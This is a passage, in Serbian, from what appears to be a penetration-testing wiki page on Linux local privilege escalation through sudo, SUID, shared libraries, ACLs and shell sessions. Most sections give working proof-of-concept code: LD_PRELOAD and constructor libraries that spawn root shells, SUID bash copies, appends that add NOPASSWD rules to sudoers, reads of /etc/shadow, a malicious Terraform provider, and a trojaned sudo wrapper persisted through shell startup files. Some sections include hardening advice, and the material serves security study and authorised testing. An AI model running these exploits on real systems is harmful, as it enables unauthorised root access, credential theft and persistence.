    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Ojačavanje:

- Uverite se da nijedan direktorijum u privilegovanoj Python putanji za uvoz nije upisiv za korisnike sa niskim privilegijama, uključujući `__pycache__`.
- Proverite vlasništvo i dozvole direktorijuma keša, uključujući postojeće `.pyc` datoteke. Onemogućavanje upisa bytecode-a može smanjiti stvaranje novih keširanih datoteka, ali ne čini bezopasnim postojeći keš koji može da se zameni.
- Sa lokalnim Python modulima i direktorijumima keša u koje može da se upisuje postupajte isto kao sa shell skriptama ili deljenim bibliotekama u koje može da se upisuje, a koje izvršava root.

### BASH_ENV očuvan preko sudo env_keep → root shell

Ako sudoers čuva `BASH_ENV` (npr. `Defaults env_keep+="ENV BASH_ENV"`), možete iskoristiti ponašanje Bash-a pri pokretanju neinteraktivnih shell-ova da biste pokrenuli proizvoljan kod kao root prilikom pozivanja dozvoljene komande.<sup>[[24]](#references)</sup>

- Zašto funkcioniše: U neinteraktivnim shell-ovima, Bash procenjuje `$BASH_ENV` i učitava tu datoteku pre pokретања целне скрипте. Многа sudo правила дозвољавају покретање скрипте или shell омотача. Ако sudo чува `BASH_ENV`, ваша датотека се учитава са root привилегијама.<sup>[[23]](#references)</sup>

- Захтеви:
  - sudo правило које можете да користите (било која циљна команда која неинтерактивно покреће `/bin/bash` или било која bash скрипта).
  - `BASH_ENV` је присутан у `env_keep` (проверите помоћу `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Ojačavanje:
  - Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`; dajte prednost opciji `env_reset`.
  - Izbegavajte shell omotače za komande dozvoljene preko sudo; koristite minimalne binarne fajlove.
  - Razmotrite sudo I/O beleženje i upozoravanje kada se koriste sačuvane promenljive okruženja.

### Terraform preko sudo-a uz očuvani HOME (!env_reset)

Kada sudo dozvoljava pokretanje Terraform-a kao korisnik sa većim privilegijama, `!env_reset` je znak da treba proveriti koje promenljive okruženja zaista preživljavaju to konkretno pravilo. Potvrdite efektivnu vrednost `HOME` ili `TF_CLI_CONFIG_FILE` pre nego što `.terraformrc` ili `terraform.rc` upisiv za pozivaoca smatrate aktivnom CLI konfiguracijom. Stavka `provider_installation.dev_overrides` je relevantna samo ako fiksna Terraform komanda učitava taj provider i ako pozivalac može da smesti njegov izvršni fajl u izabrani direktorijum.<sup>[[25]](#references)</sup>

- Usmerite potrebni provider na direktorijum u koji može da se upisuje i postavite zlonamerni plugin nazvan po provider-u (npr. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform neće uspeti da obavi Go plugin handshake, ali će izvršiti payload kao root pre nego što se sruši, ostavljajući SUID shell.

### TF_VAR overrides + zaobilaženje validacije simboličkih linkova

Terraform promenljive mogu se proslediti pomoću promenljivih okruženja `TF_VAR_<name>` ako ih konkretno sudo pravilo čuva. Za **čitanje** preko simboličkog linka na izvoru potreban je i provider koji prati link i kopira zaštićeni sadržaj na odredište čitljivo pozivaocu. Za **pisanje** preko simboličkog linka na odredištu zasebno su potrebni unos odredišta pod kontrolom pozivaoca i privilegovani provider koji ga prati pri upisu; naknadno pokrenut zakazani posao samo je jedna od mogućih posledica. Pre testiranja bilo koje rute, proverite tačno sudo ovlašćenje, relevantne `.tf` datoteke, izabranu CLI konfiguraciju i vlasništvo nad putanjama pomoću komandi koje samo čitaju podatke, kao što su `sudo -l`, `stat` i `readlink`. Slabe leksičke provere, poput `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, ne razrešavaju simboličke linkove:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform razrešava simboličku vezu i kopira stvarni `/root/root.txt` na lokaciju dostupnu napadaču za čitanje. Isti pristup može da se koristi za **upisivanje** u privilegovane putanje tako što se unapred naprave simboličke veze na odredištu (npr. da pokazuju na odredišnu putanju provajdera unutar `/etc/cron.d/`).

### requiretty / !requiretty

Na nekim starijim distribucijama, sudo može biti konfigurisan sa opcijom `requiretty`, koja primorava sudo da se pokreće samo iz interaktivnog TTY-ja. Ako je postavljena opcija `!requiretty` (ili opcija nije prisutna), sudo može da se izvršava iz neinteraktivnih konteksta, kao što su reverse shell-ovi, cron poslovi ili skripte.

```bash
Defaults !requiretty
```

Ovo samo po sebi nije direktna ranjivost, ali proširuje situacije u kojima se sudo pravila mogu zloupotrebiti bez potrebe za punim PTY-jem.

### Sudo env_keep+=PATH / nesiguran secure_path → PATH hijack

Ako `sudo -l` prikazuje `env_keep+=PATH` ili `secure_path` koji sadrži direktorijume u koje napadač može da upisuje (npr. `/home/<user>/bin`), nequalifikovana spoljašnja komanda unutar cilja koji sudo dozvoljava može biti zasenjena.<sup>[[3]](#references)</sup> I izostanak efektivnog `secure_path` vredi proveriti **ako** sudo okruženje komande čuva `PATH` koji kontroliše pozivalac; sam izostanak ne dokazuje da je tako. Pročitajte dozvoljenu skriptu bez pokretanja, a zatim proverite tačno RunAs pravilo i pravilo za argumente, efektivnu putanju za pretragu komandi i raniji direktorijum u koji može da se upisuje i kroz koji može da se prolazi, a koji sadrži ime komande. Autentifikacija, `NOEXEC`, shell builtins i apsolutne putanje do komandi mogu da promene ishod.

- Zahtevi: sudo pravilo (često `NOPASSWD`) koje pokreće skriptu/binarnu datoteku koja poziva komande bez apsolutnih putanja (`free`, `df`, `ps` itd.) i upisiva PATH stavka koja se prva pretražuje.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Zaobilaženje putanja pri izvršavanju pomoću Sudo-a
**Skočite** da biste pročitali druge datoteke ili koristite **symlinks**. Na primer, u sudoers datoteci: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Ako se koristi **wildcard** (\*), još je lakše:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Mere zaštite**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komanda/SUID binarni fajl bez putanje do komande

Ako je **sudo dozvola** data za jednu komandu **bez navođenja putanje**: _hacker10 ALL= (root) less_, možete to da iskoristite tako što ćete promeniti promenljivu PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Ova tehnika može da se koristi i ako **suid** binarni fajl **izvršava drugu komandu bez navođenja putanje do nje (uvek proverite sadržaj neobičnog SUID binarnog fajla pomoću** _**strings**_**)**.

[Payload primeri za izvršavanje.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID binarni fajl sa putanjom do komande

Ako **suid** binarni fajl **izvršava drugu komandu uz navođenje putanje**, možete da pokušate da **izvezete funkciju** čije je ime isto kao ime komande koju suid fajl poziva.

Na primer, ako suid binarni fajl poziva _**/usr/sbin/service apache2 start**_, pokušajte da napravite i izvezete funkciju:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Zatim, kada pozovete SUID binarnu datoteku, ova funkcija će biti izvršena

### Prilagođeni SUID omotači za kopiranje

SUID alat u vlasništvu root-a koji prihvata putanje izvora i odredišta može preći dve različite granice poverenja. Ako sastavlja shell komandu od bilo kog argumenta (na primer, prosleđivanjem sastavljene `cp` komande funkciji `system()`), shell metaznakovi mogu da pokrenu drugu komandu sa njegovim efektivnim privilegijama. Čak i ako bezbedno poziva `cp`, bez shell-a, neograničeno odredište može omogućiti proizvoljno privilegovano upisivanje u datoteke kao što je `/etc/passwd`. Proverite obradu argumenata u omotaču, ponašanje efektivnog UID-a, ograničenja odredišta i da li kopirana datoteka zadržava sadržaj koji kontroliše pozivalac; generička greška `cp` komande ili samo SUID bit ne dokazuju da postoji bilo koji od ovih problema. Pre bilo kakvog ručnog testiranja, pasivno proverite binarnu datoteku i njene dozvole.

### Skripta sa dozvolom za upis koju izvršava SUID omotač

Česta pogrešna konfiguracija prilagođene aplikacije je SUID binarna datoteka u vlasništvu root-a koja izvršava skriptu, dok korisnici sa niskim privilegijama imaju dozvolu za upis u samu skriptu.

Tipičan obrazac:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Ako se u `/usr/local/bin/backup.sh` može pisati, možete dodati payload komande, a zatim izvršiti SUID wrapper:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Brze provere:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Ovaj put napada je naročito čest u „maintenance“/„backup“ wrapperima koji se isporučuju u `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Promenljiva okruženja **LD_PRELOAD** koristi se za navođenje jedne ili više deljenih biblioteka (datoteka .so) koje loader treba da učita pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj postupak je poznat kao preloading biblioteke.

Međutim, radi očuvanja bezbednosti sistema i sprečavanja zloupotrebe ove funkcije, naročito kod izvršnih datoteka **suid/sgid**, sistem primenjuje određene uslove:

- Loader zanemaruje **LD_PRELOAD** za izvršne datoteke kod kojih se stvarni ID korisnika (_ruid_) ne podudara sa efektivnim ID-jem korisnika (_euid_).
- Kod izvršnih datoteka sa suid/sgid, preloaduju se samo biblioteke koje se nalaze u standardnim putanjama i koje takođe imaju suid/sgid.

Do eskalacije privilegija može doći ako možete da izvršavate komande pomoću `sudo`, a izlaz komande `sudo -l` sadrži stavku **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da se promenljiva okruženja **LD_PRELOAD** sačuva i prepozna čak i kada se komande izvršavaju pomoću `sudo`, što može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Sačuvaj kao **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Zatim ga **kompajlirajte** koristeći:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Na kraju, **eskalirajte privilegije** pokretanjem

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Sličan privesc može biti zloupotrebljen ako napadač kontroliše env promenljivu **LD_LIBRARY_PATH**, jer kontroliše putanju na kojoj će se tražiti biblioteke.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Kada naiđete na binarnu datoteku sa **SUID** dozvolama koja deluje neobično, dobra je praksa da proverite da li ispravno učitava **.so** datoteke. To možete proveriti pokretanjem sledeće komande:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Na primer, nailazak na grešku poput _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ ukazuje na mogućnost exploit-a.

Da bi se ovo iskoristilo, potrebno je napraviti C datoteku, recimo _"/path/to/.config/libcalc.c"_, koja sadrži sledeći kod:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Ovaj kod, nakon što se kompajlira i izvrši, ima za cilj da podigne privilegije manipulisanjem dozvolama fajlova i pokretanjem shell-a sa povišenim privilegijama.

Kompajlirajte gornji C fajl u deljeni objekat (.so) pomoću:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Konačno, pokretanje pogođene SUID binarne datoteke trebalo bi da aktivira exploit, što može dovesti do kompromitovanja sistema.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Sada kada smo pronašli SUID binary koji učitava biblioteku iz fascikle u koju možemo da pišemo, hajde da napravimo biblioteku u toj fascikli sa potrebnim imenom:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Ako dobijete grešku kao što je

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

to znači da biblioteka koju ste generisali mora da ima funkciju pod nazivom `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je pažljivo sastavljena lista Unix binarnih datoteka koje napadač može da iskoristi za zaobilaženje lokalnih bezbednosnih ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto to, ali za slučajeve u kojima možete da **ubacujete samo argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih datoteka koje se mogu zloupotrebiti za izlazak iz ograničenih shell-ova, eskalaciju ili održavanje povišenih privilegija, prenos datoteka, pokretanje bind i reverse shell-ova i obavljanje drugih zadataka nakon eksploatacije.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako možete da pristupite komandi `sudo -l`, možete da upotrebite alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li može da pronađe način za eksploataciju nekog sudo pravila.

### Ponovno korišćenje Sudo tokena

U slučajevima kada imate **sudo pristup**, ali ne i lozinku, možete da eskalirate privilegije tako što ćete **sačekati izvršavanje sudo komande, a zatim preoteti token sesije**.<sup>[[18]](#references)</sup>

Uslovi za eskalaciju privilegija:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** za izvršavanje nečega u **poslednjih 15 minuta** (to je podrazumevano trajanje sudo tokena, koji nam omogućava da koristimo `sudo` bez unošenja lozinke)
- Vrednost komande `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete da ga otpremite)

(`ptrace_scope` možete privremeno da omogućite komandom `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno tako što ćete izmeniti `/etc/sysctl.d/10-ptrace.conf` i postaviti `kernel.yama.ptrace_scope = 0`)

Ako su ispunjeni svi ovi uslovi, **možete da eskalirate privilegije pomoću:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Prvi exploit** (`exploit.sh`) kreira binarnu datoteku `activate_sudo_token` u _/tmp_. Možete da je upotrebite za **aktiviranje sudo tokena u svojoj sesiji** (nećete automatski dobiti root shell; pokrenite `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Drugi exploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **u vlasništvu root-a sa setuid bitom**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Treći exploit** (`exploit_v3.sh`) će **kreirati sudoers fajl** koji čini **sudo tokene večnim i omogućava svim korisnicima da koriste sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Ako imate **dozvole za upisivanje** u fasciklu ili u bilo koju od kreiranih datoteka unutar fascikle, možete koristiti binarni fajl [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **kreirate sudo token za korisnika i PID**.\
Na primer, ako možete da prepišete datoteku _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID-om 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku tako što ćete uraditi:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Datoteka `/etc/sudoers` i datoteke unutar direktorijuma `/etc/sudoers.d` određuju ko može da koristi `sudo` i kako. Ove datoteke **po podrazumevanim podešavanjima mogu da čitaju samo korisnik root i grupa root**.\
**Ako** možete da **čitate** ovu datoteku, možda ćete moći da **dođete do zanimljivih informacija**, a ako možete da **pišete** u bilo koju datoteku, moći ćete da **eskalirate privilegije**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Ako možete da upisujete, možete zloupotrebiti ovu dozvolu.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Još jedan način da se zloupotrebe ove dozvole:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Postoje alternative za binarnu datoteku `sudo`, kao što je `doas` za OpenBSD. Ne zaboravite da proverite konfiguraciju u `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Ako `doas` dozvoljava editor ili interpreter, proverite mogućnosti za escape u stilu GTFOBins:

```bash
doas vim
:!/bin/sh
```

Pravilo za `doas` koje omogućava pokretanje kao root i koristi originalni `dstat` zasnovan na Pythonu takođe zaslužuje proveru putanja za pluginove. U [uputstvu](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) i [izvornom kodu](https://github.com/dstat-real/dstat/blob/master/dstat) navedeni su `/usr/share/dstat/` i `/usr/local/share/dstat/` među lokacijama za `dstat_*.py` pluginove. Ako trenutni korisnik može da upisuje u lokaciju koju instalirana verzija zaista koristi i da pretražuje tu lokaciju, izabrani plugin može da se pokrene sa `doas` RunAs identitetom. Proverite efektivno pravilo, pretragu pluginova u toj verziji, dozvole ili ACL-ove za direktorijum i njegove nadređene direktorijume, kao i da li pozivalac može da izabere plugin; samo `dstat` pravilo ili direktorijum u koji može da se upisuje predstavljaju tek trag. Druge implementacije `dstat`-a mogu da koriste drugačije sisteme za pluginove. Pasivno pregledajte metapodatke, bez učitavanja plugina.

### Sudo Hijacking

Ako znate da se **korisnik obično povezuje sa mašinom i koristi `sudo`** za eskalaciju privilegija, a dobili ste shell u kontekstu tog korisnika, možete **napraviti novu izvršnu datoteku `sudo`** koja će izvršiti vaš kod kao root, a zatim korisnikovu komandu. Potom **izmenite $PATH** korisničkog konteksta (na primer, dodavanjem nove putanje u .bash_profile) kako bi se pri korisnikovom pokretanju komande `sudo` izvršila vaša izvršna datoteka `sudo`.

Imajte na umu da, ako korisnik koristi drugu školjku (ne bash), moraćete da izmenite druge datoteke kako biste dodali novu putanju. Na primer, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) menja `~/.bashrc`, `~/.zshrc` i `~/.bash_profile`. Drugi primer možete pronaći u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokrenite nešto poput:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Deljena biblioteka

### ld.so

Datoteka `/etc/ld.so.conf` pokazuje **odakle potiču učitane konfiguracione datoteke**. Obično ova datoteka sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf` biti pročitane. Ove konfiguracione datoteke **upućuju na druge fascikle** u kojima će se **pretraživati** **biblioteke**. Na primer, sadržaj datoteke `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem pretraživati biblioteke u fascikli `/usr/local/lib`**.

Ako iz bilo kog razloga **korisnik ima dozvole za pisanje** u bilo koju od navedenih putanja: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo koju datoteku unutar `/etc/ld.so.conf.d/` ili bilo koju fasciklu navedenu u konfiguracionoj datoteci unutar `/etc/ld.so.conf.d/*.conf`, možda će moći da eskalira privilegije.\
Pogledajte **kako da exploitujete ovu pogrešnu konfiguraciju** na sledećoj stranici:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Kopiranjem biblioteke u `/var/tmp/flag15/`, program će je koristiti sa ove lokacije, kako je navedeno u promenljivoj `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Zatim napravite zlonamernu biblioteku u `/var/tmp` pomoću `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Mogućnosti

Linux capabilities obezbeđuju **procesu podskup dostupnih root privilegija**. Time se root **privilegije dele na manje, zasebne jedinice**. Svaka od ovih jedinica zatim može nezavisno da se dodeli procesima. Na ovaj način se smanjuje ukupan skup privilegija, čime se umanjuje rizik od eksploatacije.\
Pročitajte sledeću stranicu da biste **saznali više o capabilities i načinima njihove zloupotrebe**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Dozvole direktorijuma

U direktorijumu, **bit za „execute“** znači da korisnik na koga se odnosi može da uđe u fasciklu pomoću komande „**cd**“.\
Bit za **„read“** znači da korisnik može da **izlista** **datoteke**, a bit za **„write“** znači da može da **briše** i **kreira** nove **datoteke**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, koji može da **nadjača tradicionalne ugo/rwx dozvole**. Ove dozvole unapređuju kontrolu pristupa datotekama ili direktorijumima tako što omogućavaju ili uskraćuju prava određenim korisnicima koji nisu vlasnici niti pripadaju grupi. Ovaj nivo **preciznosti omogućava detaljnije upravljanje pristupom**. Više detalja možete pronaći [**ovde**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Dodelite** korisniku „kali“ dozvole za čitanje i pisanje nad datotekom:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Pribavite** fajlove sa određenim ACL-ovima iz sistema:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Skriveni ACL backdoor u sudoers drop-in datotekama

Česta pogrešna konfiguracija je datoteka u `/etc/sudoers.d/` u vlasništvu root-a, sa režimom `440`, koja ipak putem ACL-a omogućava korisniku sa niskim privilegijama pristup za pisanje.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Ako vidite nešto poput `user:alice:rw-`, korisnik može dodati sudo pravilo uprkos restriktivnim bitovima režima:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Ovo je putanja za ACL persistence/privesc visokog uticaja, jer se lako previdi pri pregledima koji se oslanjaju samo na `ls -l`.

## Otvorene shell sesije

Pristup GNU Screen sesijama između korisnika zavisi od konfiguracije i ACL-a aktivne sesije, a ne samo od njene verzije. [GNU Screen documents](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) da mora biti kompajliran sa podrškom za više korisnika; `multiuser on` i dozvola `acladd` ili odgovarajuća dozvola `aclchg` omogućavaju drugom korisniku da se poveže. [The manual also requires setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) za pronalaženje sesije između korisnika. Samo vidljiva soket datoteka u vlasništvu root-a ili SUID `screen` binarna datoteka ne dokazuju da je root shell dostupan za povezivanje. Pre nego što to smatrate eskalacijom privilegija, proverite da li aktivna sesija podržava više korisnika, da li trenutni korisnik ima efektivne dozvole za unos komandi i da li se shell u toj sesiji izvršava kao privilegovani vlasnik.

### Hijacking screen sesija

**Izlistaj screen sesije**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![otmica screen sesija - Lokacije socket-a (neki sistemi jednu lokaciju prikazuju kao simboličku vezu ka drugoj): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Povežite se sa sesijom**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## Otmica tmux sesija

Ovo je bio problem sa **starim verzijama tmux-a**. Nisam uspeo da preuzmem tmux sesiju (v2.1) koju je pokrenuo root, kao neprivilegovani korisnik.

**Prikaži tmux sesije**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Lokacije socket-a (neki sistemi izlažu jedan kao simboličku vezu ka drugom) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Izlistajte sesije koristeći taj socket; možete pokrenuti tmux sesiju na tom socket-u...](<../../images/image (837).png>)

**Povežite se sa sesijom**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Proverite **Valentine box from HTB** za primer.

## SSH

### Predvidljiv PRNG u Debian OpenSSL-u - CVE-2008-0166

Ključevi generisani pomoću pogođenih Debian ili derivativnih OpenSSL verzija tokom istorijskog perioda ranjivosti mogu imati predvidljivu nasumičnost; trenutna distribucija na hostu ili zakrpljena verzija OpenSSL-a ne govore kako je stariji ključ generisan. Proverite **konkretan ključ** pomoću odgovarajuće istorijske blacklist liste i utvrdite njegovo poreklo. Debianov priručnik [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) opisuje proveru javnih ključeva i datoteka `authorized_keys`, a [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) beleži ispravku za OpenSSL. Zapis u datoteci `authorized_keys` privilegovanog naloga predstavlja trag za eskalaciju samo ako se može doći do odgovarajućeg privatnog ključa i ako efektivna SSH politika i dalje prihvata taj ključ za taj nalog; slab **host** ključ sam po sebi nije akreditiv za prijavu. Zamenite kompromitovane ključeve i uklonite njihova stara ovlašćenja.

### Zanimljive vrednosti SSH konfiguracije

- **PasswordAuthentication:** Određuje da li je dozvoljena autentifikacija lozinkom. Podrazumevana vrednost u upstream OpenSSH-u je `yes`; konfiguracija distribucije može da je nadjača.
- **PubkeyAuthentication:** Određuje da li je dozvoljena autentifikacija javnim ključem. Podrazumevana vrednost je `yes`.
- **PermitEmptyPasswords**: Kada je dozvoljena autentifikacija lozinkom, određuje da li server dozvoljava prijavu na naloge sa praznim lozinkama. Podrazumevana vrednost je `no`.

### Datoteke za kontrolu prijave

